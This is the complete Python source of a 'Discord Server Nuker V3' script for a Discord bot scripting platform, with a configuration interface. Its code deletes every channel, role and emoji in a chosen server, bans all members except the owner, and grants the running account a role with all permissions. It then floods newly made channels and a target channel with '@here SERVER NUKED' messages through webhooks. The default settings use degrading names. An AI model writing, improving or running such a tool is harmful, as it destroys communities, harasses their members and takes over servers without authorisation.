@nightyScript(
    name="Discord Server Nuker V3",
    author="Awizz",
    description="Advanced Nuker Tool made by Awizz",
    version="3.0"
)
def discordServerNukerV3():
    import discord
    import asyncio
    import json
    import re
    from pathlib import Path
    
    # ==================== CONFIGURATION MANAGER ====================
    class ConfigManager:
        def __init__(self):
            self.config_dir = Path(getScriptsPath()) / "json" / "server_nuker_v3"
            self.config_file = self.config_dir / "config.json"
            self.backup_dir = self.config_dir / "backups"
            self._ensure_directories()
            self.default_config = self._get_default_config()
            
        def _ensure_directories(self):
            """Create necessary directories"""
            self.config_dir.mkdir(parents=True, exist_ok=True)
            self.backup_dir.mkdir(exist_ok=True)
            
        def _get_default_config(self):
            return {
                "target_server_id": "",
                "target_channel_id": "",
                "server_settings": {
                    "custom_name": "Awizz's slaves",
                    "custom_icon_url": "https://avatars.githubusercontent.com/u/241494424?v=4",
                    "delete_roles": True,
                    "delete_channels": True,
                    "ban_members": False,
                    "delete_emojis": False,
                    "create_admin_role": False,
                    "admin_role_name": "ADMIN"
                },
                "channel_settings": {
                    "spam_message": "@here SERVER NUKED BY Awizz",
                    "webhook_spam_count": 5,
                    "webhook_username": "Anal Destroyer",
                    "channels_to_create": 5,
                    "channel_names": "nuked,rekt,awizz-was-here,logs,fucked"
                },
                "safety_settings": {
                    "confirm_before_nuke": True,
                    "backup_before_destruction": False,
                    "max_operation_time": 300
                },
                "ui_state": {
                    "last_refresh": "",
                    "active_tab": "main"
                }
            }
        
        def load_config(self):
            """Load configuration from file"""
            if self.config_file.exists():
                try:
                    with open(self.config_file, 'r', encoding='utf-8') as f:
                        loaded = json.load(f)
                    return self._merge_configs(self.default_config, loaded)
                except Exception as e:
                    print(f"Config load error: {e}")
            return self.default_config.copy()
        
        def save_config(self, config):
            """Save configuration to file"""
            try:
                with open(self.config_file, 'w', encoding='utf-8') as f:
                    json.dump(config, f, indent=2, ensure_ascii=False)
                return True
            except Exception as e:
                print(f"Config save error: {e}")
                return False
        
        def _merge_configs(self, default, loaded):
            """Deep merge configurations"""
            merged = default.copy()
            for key, value in loaded.items():
                if isinstance(value, dict) and key in merged:
                    merged[key] = self._merge_configs(merged[key], value)
                else:
                    merged[key] = value
            return merged

    # ==================== VALIDATION UTILITIES ====================
    class Validators:
        @staticmethod
        def discord_id(value):
            """Validate Discord ID format"""
            return bool(re.match(r'^\d{17,20}$', str(value).strip()))
        
        @staticmethod
        def webhook_count(value):
            """Validate webhook spam count"""
            try:
                count = int(value)
                return 1 <= count <= 50
            except:
                return False
        
        @staticmethod
        def channel_count(value):
            """Validate channel creation count"""
            try:
                count = int(value)
                return 1 <= count <= 50
            except:
                return False
        
        @staticmethod
        def url(value):
            """Validate URL format"""
            if not value.strip():
                return True
            pattern = r'^https?://[^\s/$.?#].[^\s]*$'
            return bool(re.match(pattern, value.strip()))
        
        @staticmethod
        def username(value):
            """Validate webhook username"""
            return 2 <= len(value.strip()) <= 32

    # ==================== SERVER MANAGER ====================
    class ServerManager:
        def __init__(self, config_manager):
            self.config = config_manager
            self.validators = Validators()
            
        async def nuke_server(self, progress_callback=None):
            """Execute server nuke operation"""
            config = self.config.load_config()
            server_id = config["target_server_id"]
            
            if not self.validators.discord_id(server_id):
                return False, "Invalid server ID"
            
            guild = bot.get_guild(int(server_id))
            if not guild:
                return False, "Server not found or bot not in server"
            
            # Permission check
            if not guild.me.guild_permissions.administrator:
                return False, "Bot needs administrator permissions"
            
            results = []
            
            try:
                # Update server name and icon
                if config["server_settings"]["custom_name"] or config["server_settings"]["custom_icon_url"]:
                    try:
                        edit_kwargs = {}
                        if config["server_settings"]["custom_name"]:
                            edit_kwargs['name'] = config["server_settings"]["custom_name"]
                        # Note: Icon setting would require image download
                        # await guild.edit(**edit_kwargs)
                        results.append("✓ Server appearance updated")
                    except Exception as e:
                        results.append(f"✗ Server update failed: {e}")
                
                # Delete channels
                if config["server_settings"]["delete_channels"]:
                    deleted_channels = await self._delete_all_channels(guild)
                    results.append(f"✓ Deleted {deleted_channels} channels")
                    
                    # Create new channels and spam
                    created = await self._create_spam_channels(guild, config)
                    results.append(f"✓ Created {created} spam channels")
                
                # Delete roles
                if config["server_settings"]["delete_roles"]:
                    deleted_roles = await self._delete_all_roles(guild)
                    results.append(f"✓ Deleted {deleted_roles} roles")
                
                # Ban members
                if config["server_settings"]["ban_members"]:
                    banned = await self._ban_all_members(guild)
                    results.append(f"✓ Banned {banned} members")
                
                # Delete emojis
                if config["server_settings"]["delete_emojis"]:
                    deleted_emojis = await self._delete_all_emojis(guild)
                    results.append(f"✓ Deleted {deleted_emojis} emojis")
                
                # Create admin role
                if config["server_settings"]["create_admin_role"]:
                    success = await self._create_admin_role(guild, config)
                    if success:
                        results.append(f"✓ Admin role '{config['server_settings']['admin_role_name']}' created")
                    else:
                        results.append("✗ Admin role creation failed")
                
                return True, "\n".join(results)
                
            except Exception as e:
                return False, f"Nuke operation failed: {str(e)}"
        
        async def spam_channel(self):
            """Execute channel spam operation"""
            config = self.config.load_config()
            channel_id = config["target_channel_id"]
            
            if not self.validators.discord_id(channel_id):
                return False, "Invalid channel ID"
            
            channel = bot.get_channel(int(channel_id))
            if not channel:
                return False, "Channel not found"
            
            try:
                webhook = await channel.create_webhook(name="nuker-webhook")
                spam_count = config["channel_settings"]["webhook_spam_count"]
                
                for i in range(spam_count):
                    await webhook.send(
                        content=config["channel_settings"]["spam_message"],
                        username=config["channel_settings"]["webhook_username"]
                    )
                    await asyncio.sleep(0.5)
                
                return True, f"Sent {spam_count} messages to channel"
                
            except Exception as e:
                return False, f"Spam operation failed: {str(e)}"
        
        async def _delete_all_channels(self, guild):
            """Delete all channels in guild"""
            count = 0
            for channel in list(guild.channels):
                try:
                    await channel.delete()
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    continue
            return count
        
        async def _create_spam_channels(self, guild, config):
            """Create spam channels with webhooks"""
            settings = config["channel_settings"]
            channel_names = [name.strip() for name in settings["channel_names"].split(",")]
            created_count = 0
            
            for i in range(settings["channels_to_create"]):
                try:
                    name = channel_names[i % len(channel_names)] if channel_names else f"nuked-{i+1}"
                    channel = await guild.create_text_channel(name)
                    
                    # Create webhook and spam
                    webhook = await channel.create_webhook(name="nuke-webhook")
                    for j in range(settings["webhook_spam_count"]):
                        await webhook.send(
                            content=settings["spam_message"],
                            username=settings["webhook_username"]
                        )
                        await asyncio.sleep(0.5)
                    
                    created_count += 1
                except:
                    continue
            
            return created_count
        
        async def _delete_all_roles(self, guild):
            """Delete all roles except @everyone"""
            count = 0
            for role in guild.roles:
                if role != guild.default_role and role.position < guild.me.top_role.position:
                    try:
                        await role.delete()
                        count += 1
                        await asyncio.sleep(0.2)
                    except:
                        continue
            return count
        
        async def _ban_all_members(self, guild):
            """Ban all members except self and owner"""
            count = 0
            for member in guild.members:
                if member != guild.me and member != guild.owner:
                    try:
                        await member.ban(reason="Server nuke", delete_message_days=0)
                        count += 1
                        await asyncio.sleep(0.5)
                    except:
                        continue
            return count
        
        async def _delete_all_emojis(self, guild):
            """Delete all emojis"""
            count = 0
            for emoji in guild.emojis:
                try:
                    await emoji.delete()
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    continue
            return count
        
        async def _create_admin_role(self, guild, config):
            """Create admin role for bot"""
            try:
                admin_role = await guild.create_role(
                    name=config["server_settings"]["admin_role_name"],
                    permissions=discord.Permissions.all(),
                    reason="Nuke admin role"
                )
                await guild.me.add_roles(admin_role)
                return True
            except:
                return False

    # ==================== UI COMPONENTS ====================
    class UIComponents:
        def __init__(self, config_manager, server_manager):
            self.config = config_manager
            self.server = server_manager
            self.tab = None
            
        def create_ui(self):
            """Create the main UI interface"""
            self.tab = Tab(name="Server Nuker V3", title="Advanced Server Management", icon="⚡")
            
            # Security Notice
            self._create_security_notice()
            
            # Main content in columns
            cols = self.tab.create_container(type="columns", gap=4)
            
            # Left column - Configuration
            left_col = cols.create_container(type="rows", width="60%", gap=4)
            self._create_target_selection(left_col)
            self._create_server_config(left_col)
            self._create_channel_config(left_col)
            
            # Right column - Actions and Summary
            right_col = cols.create_container(type="rows", width="40%", gap=4)
            self._create_actions_card(right_col)
            self._create_summary_card(right_col)
            
            self.tab.render()
        
        def _create_security_notice(self):
            """Create security notice card"""
            security_card = self.tab.create_card(height="auto", width="full", gap=3)
            security_card.create_ui_element(UI.Text, content="🔒 Security Notice", size="xl", weight="bold", color="red")
            
            notice_text = (
                "This script has NO text commands. All operations can ONLY be "
                "performed through this secure UI interface that only YOU can "
                "access. Nobody can command your account to nuke or spam servers.\n\n"
                "Protected Features:\n"
                "• No command-based access\n"
                "• UI-only operation\n"
                "• Direct bot API usage\n"
                "• In-memory configuration\n"
                "• Real-time validation\n"
                "• Protected execution"
            )
            
            security_card.create_ui_element(UI.Text, content=notice_text, size="sm")
        
        def _create_target_selection(self, parent):
            """Create target selection card"""
            card = parent.create_card(height="auto", width="full", gap=4)
            card.create_ui_element(UI.Text, content="🎯 Target Selection", size="xl", weight="bold")
            card.create_ui_element(UI.Text, content="Specify the Server ID and/or Channel ID for targeted actions", size="sm")
            
            cols = card.create_container(type="columns", gap=4)
            
            # Server ID input
            server_col = cols.create_card(height="auto", width="half", gap=3)
            server_col.create_ui_element(UI.Text, content="Server ID (for nuke)", size="md", weight="bold")
            server_col.create_ui_element(UI.Text, content="The Discord server ID you want to nuke", size="sm", color="gray")
            
            def update_server_id(value):
                config = self.config.load_config()
                config["target_server_id"] = value.strip()
                self.config.save_config(config)
            
            server_col.create_ui_element(
                UI.Input,
                label="Enter server ID...",
                value=self.config.load_config()["target_server_id"],
                onInput=update_server_id,
                full_width=True
            )
            
            # Channel ID input
            channel_col = cols.create_card(height="auto", width="half", gap=3)
            channel_col.create_ui_element(UI.Text, content="Channel ID (for spam)", size="md", weight="bold")
            channel_col.create_ui_element(UI.Text, content="The Discord channel ID you want to spam", size="sm", color="gray")
            
            def update_channel_id(value):
                config = self.config.load_config()
                config["target_channel_id"] = value.strip()
                self.config.save_config(config)
            
            channel_col.create_ui_element(
                UI.Input,
                label="Enter channel ID...",
                value=self.config.load_config()["target_channel_id"],
                onInput=update_channel_id,
                full_width=True
            )
        
        def _create_server_config(self, parent):
            """Create server configuration card"""
            card = parent.create_card(height="auto", width="full", gap=4)
            card.create_ui_element(UI.Text, content="⚙️ Server Configuration", size="xl", weight="bold")
            
            # Custom Server Name
            name_group = card.create_group(type="rows", gap=2, full_width=True)
            name_group.create_ui_element(UI.Text, content="Custom Server Name", size="md", weight="bold")
            name_group.create_ui_element(UI.Text, content="Leave empty to skip", size="sm", color="gray")
            
            def update_custom_name(value):
                config = self.config.load_config()
                config["server_settings"]["custom_name"] = value
                self.config.save_config(config)
            
            name_group.create_ui_element(
                UI.Input,
                label="New name for server after nuke (optional)",
                value=self.config.load_config()["server_settings"]["custom_name"],
                onInput=update_custom_name,
                full_width=True
            )
            
            # Custom Server Icon
            icon_group = card.create_group(type="rows", gap=2, full_width=True)
            icon_group.create_ui_element(UI.Text, content="Custom Server Icon URL", size="md", weight="bold")
            
            def update_custom_icon(value):
                config = self.config.load_config()
                config["server_settings"]["custom_icon_url"] = value
                self.config.save_config(config)
            
            icon_group.create_ui_element(
                UI.Input,
                label="New icon URL (optional)",
                placeholder="https://example.com/icon.png",
                value=self.config.load_config()["server_settings"]["custom_icon_url"],
                onInput=update_custom_icon,
                full_width=True
            )
            
            # Default Behavior
            card.create_ui_element(UI.Text, content="🔧 Default Behavior", size="lg", weight="bold")
            card.create_ui_element(UI.Text, content="Core destruction settings", size="sm", color="gray")
            
            # Behavior toggles in columns
            toggle_cols = card.create_container(type="columns", gap=4)
            col1 = toggle_cols.create_group(type="rows", gap=3, full_width=True)
            col2 = toggle_cols.create_group(type="rows", gap=3, full_width=True)
            
            config = self.config.load_config()
            server_settings = config["server_settings"]
            
            # Toggle functions
            def toggle_delete_roles(checked):
                config = self.config.load_config()
                config["server_settings"]["delete_roles"] = checked
                self.config.save_config(config)
            
            def toggle_delete_channels(checked):
                config = self.config.load_config()
                config["server_settings"]["delete_channels"] = checked
                self.config.save_config(config)
            
            def toggle_ban_members(checked):
                config = self.config.load_config()
                config["server_settings"]["ban_members"] = checked
                self.config.save_config(config)
            
            def toggle_delete_emojis(checked):
                config = self.config.load_config()
                config["server_settings"]["delete_emojis"] = checked
                self.config.save_config(config)
            
            def toggle_create_admin(checked):
                config = self.config.load_config()
                config["server_settings"]["create_admin_role"] = checked
                self.config.save_config(config)
            
            def update_admin_name(value):
                config = self.config.load_config()
                config["server_settings"]["admin_role_name"] = value
                self.config.save_config(config)
            
            # Column 1 toggles
            col1.create_ui_element(UI.Toggle, label="Auto-Delete Roles", checked=server_settings["delete_roles"], onChange=toggle_delete_roles)
            col1.create_ui_element(UI.Toggle, label="Auto-Delete Channels", checked=server_settings["delete_channels"], onChange=toggle_delete_channels)
            col1.create_ui_element(UI.Toggle, label="Ban All Members", checked=server_settings["ban_members"], onChange=toggle_ban_members)
            
            # Column 2 toggles
            col2.create_ui_element(UI.Toggle, label="Delete All Emojis", checked=server_settings["delete_emojis"], onChange=toggle_delete_emojis)
            col2.create_ui_element(UI.Toggle, label="Create Admin Role for Self", checked=server_settings["create_admin_role"], onChange=toggle_create_admin)
            col2.create_ui_element(UI.Input, label="Admin Role Name", value=server_settings["admin_role_name"], onInput=update_admin_name, full_width=True)
        
        def _create_channel_config(self, parent):
            """Create channel configuration card"""
            card = parent.create_card(height="auto", width="full", gap=4)
            card.create_ui_element(UI.Text, content="💬 Channel Configuration", size="xl", weight="bold")
            
            # Message & Webhook Config
            message_group = card.create_group(type="rows", gap=3, full_width=True)
            message_group.create_ui_element(UI.Text, content="Message & Webhook Config", size="lg", weight="bold")
            
            # Spam Message
            def update_spam_message(value):
                config = self.config.load_config()
                config["channel_settings"]["spam_message"] = value
                self.config.save_config(config)
            
            message_input = message_group.create_ui_element(
                UI.Input,
                label="Default Spam Message",
                value=self.config.load_config()["channel_settings"]["spam_message"],
                onInput=update_spam_message,
                full_width=True
            )
            message_group.create_ui_element(UI.Text, content="Message sent via webhooks (@here is automatically added)", size="sm", color="gray")
            
            # Webhook settings in columns
            webhook_cols = card.create_container(type="columns", gap=4)
            
            # Webhook Spam Count
            def update_webhook_count(value):
                if Validators().webhook_count(value):
                    config = self.config.load_config()
                    config["channel_settings"]["webhook_spam_count"] = int(value)
                    self.config.save_config(config)
            
            webhook_col1 = webhook_cols.create_card(height="auto", width="half", gap=3)
            webhook_col1.create_ui_element(UI.Text, content="Webhook Spam Count", size="md", weight="bold")
            webhook_col1.create_ui_element(
                UI.Input,
                label="Number of messages sent per webhook",
                value=str(self.config.load_config()["channel_settings"]["webhook_spam_count"]),
                onInput=update_webhook_count,
                full_width=True
            )
            
            # Webhook Username
            def update_webhook_username(value):
                if Validators().username(value):
                    config = self.config.load_config()
                    config["channel_settings"]["webhook_username"] = value
                    self.config.save_config(config)
            
            webhook_col2 = webhook_cols.create_card(height="auto", width="half", gap=3)
            webhook_col2.create_ui_element(UI.Text, content="Webhook Username", size="md", weight="bold")
            webhook_col2.create_ui_element(
                UI.Input,
                label="Custom username for webhook messages",
                value=self.config.load_config()["channel_settings"]["webhook_username"],
                onInput=update_webhook_username,
                full_width=True
            )
        
        def _create_actions_card(self, parent):
            """Create actions execution card"""
            card = parent.create_card(height="auto", width="full", gap=4)
            card.create_ui_element(UI.Text, content="🚀 Execute Actions", size="xl", weight="bold")
            card.create_ui_element(UI.Text, content="Use Server ID and Channel ID from Target Selection above", size="sm")
            
            action_buttons = card.create_group(type="columns", gap=3, full_width=True)
            
            # Nuke Server button
            async def execute_nuke():
                config = self.config.load_config()
                
                if not config["target_server_id"]:
                    self.tab.toast("ERROR", "Missing Server ID", "Please enter a valid Server ID first")
                    return
                
                if config["safety_settings"]["confirm_before_nuke"]:
                    if not await self.tab.confirm("⚠️ CONFIRM SERVER NUKE", 
                                               f"Are you absolutely sure you want to nuke server {config['target_server_id']}? This action is IRREVERSIBLE!"):
                        return
                
                nuke_button.loading = True
                success, message = await self.server.nuke_server()
                
                if success:
                    self.tab.toast("SUCCESS", "Nuke Completed", message)
                else:
                    self.tab.toast("ERROR", "Nuke Failed", message)
                
                nuke_button.loading = False
            
            nuke_button = action_buttons.create_ui_element(
                UI.Button,
                label="NUKE SERVER",
                onClick=execute_nuke,
                full_width=True,
                color="danger"
            )
            
            # Spam Channel button
            async def execute_spam():
                config = self.config.load_config()
                
                if not config["target_channel_id"]:
                    self.tab.toast("ERROR", "Missing Channel ID", "Please enter a valid Channel ID first")
                    return
                
                if not await self.tab.confirm("Confirm Spam", 
                                           f"Send {config['channel_settings']['webhook_spam_count']} messages to channel {config['target_channel_id']}?"):
                    return
                
                spam_button.loading = True
                success, message = await self.server.spam_channel()
                
                if success:
                    self.tab.toast("SUCCESS", "Spam Completed", message)
                else:
                    self.tab.toast("ERROR", "Spam Failed", message)
                
                spam_button.loading = False
            
            spam_button = action_buttons.create_ui_element(
                UI.Button,
                label="SPAM CHANNEL",
                onClick=execute_spam,
                full_width=True,
                color="primary"
            )
        
        def _create_summary_card(self, parent):
            """Create configuration summary card"""
            card = parent.create_card(height="auto", width="full", gap=4)
            card.create_ui_element(UI.Text, content="📊 Configuration Summary", size="xl", weight="bold")
            
            # Summary display
            self.summary_display = card.create_ui_element(UI.Text, content="", size="sm", full_width=True)
            
            # Control buttons
            control_group = card.create_group(type="columns", gap=3, full_width=True)
            
            async def refresh_display():
                self._update_summary()
                self.tab.toast("INFO", "Refreshed", "Display updated with current configuration")
            
            async def reset_defaults():
                if await self.tab.confirm("Reset Configuration", "Reset all settings to defaults?"):
                    default_config = self.config.default_config
                    self.config.save_config(default_config)
                    self._update_summary()
                    self.tab.toast("SUCCESS", "Reset Complete", "All settings restored to defaults")
            
            control_group.create_ui_element(UI.Button, label="Refresh Display", onClick=refresh_display, full_width=True, color="secondary")
            control_group.create_ui_element(UI.Button, label="Reset to Defaults", onClick=reset_defaults, full_width=True, color="secondary")
            
            # Initial summary update
            self._update_summary()
        
        def _update_summary(self):
            """Update the configuration summary display"""
            config = self.config.load_config()
            server_settings = config["server_settings"]
            channel_settings = config["channel_settings"]
            
            server_status = config["target_server_id"] if config["target_server_id"] else "Not set"
            channel_status = config["target_channel_id"] if config["target_channel_id"] else "Not set"
            
            summary_text = f"""Target Server: {server_status}
Target Channel: {channel_status}
Channel Names: {channel_settings['channel_names']}
Default Count: {channel_settings['channels_to_create']} channels
Max Limit: 50 channels
Webhook Spams: {channel_settings['webhook_spam_count']} messages
Webhook Username: {channel_settings['webhook_username']}
Name Length: 6 chars
Delete Roles: {'Yes' if server_settings['delete_roles'] else 'No'}
Delete Channels: {'Yes' if server_settings['delete_channels'] else 'No'}
Ban Members: {'Yes' if server_settings['ban_members'] else 'No'}
Delete Emojis: {'Yes' if server_settings['delete_emojis'] else 'No'}
Create Admin: {'Yes' if server_settings['create_admin_role'] else 'No'}"""
            
            if hasattr(self, 'summary_display'):
                self.summary_display.content = summary_text

    # ==================== MAIN EXECUTION ====================
    
    # Initialize managers
    config_manager = ConfigManager()
    server_manager = ServerManager(config_manager)
    
    # Create and display UI
    ui = UIComponents(config_manager, server_manager)
    ui.create_ui()

discordServerNukerV3()
